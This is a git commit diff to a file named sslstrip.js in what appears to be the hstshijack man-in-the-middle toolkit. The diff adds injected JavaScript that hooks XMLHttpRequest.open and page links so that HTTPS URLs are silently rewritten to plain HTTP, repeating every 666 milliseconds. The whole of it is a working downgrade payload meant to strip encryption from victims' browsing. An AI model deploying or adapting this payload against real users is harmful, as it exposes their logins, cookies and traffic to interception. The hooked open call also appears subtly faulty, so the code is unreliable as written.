3c35c81194bd5573d8fd7ebf5003a2c5de74177c
yungtravla <lilprismontour@gmail.com>
2018-09-17 00:30:12 +1000

    also sslstrip XMLHttpRequest

--- hstshijack/payloads/sslstrip.js
+++ hstshijack/payloads/sslstrip.js
@@ -1,5 +1,12 @@
+XMLHttpRequest.prototype.obf_open = XMLHttpRequest.prototype.open
+XMLHttpRequest.prototype.open = function(method, url, async, username, password) {
+	url = url.replace(/(http)s/ig, "$1")
+
+	XMLHttpRequest.prototype.obf_open(method, url, async, username, password)
+}
+
 setInterval(function(){
-	document.querySelectorAll("a").forEach(function(a){
-		a.href = a.href.replace(/https\:\/\//ig, "http://")
+	document.querySelectorAll("a").forEach(function(obf_a){
+		obf_a.href = obf_a.href.replace(/(http)s/ig, "http")
 	})
 }, 666)
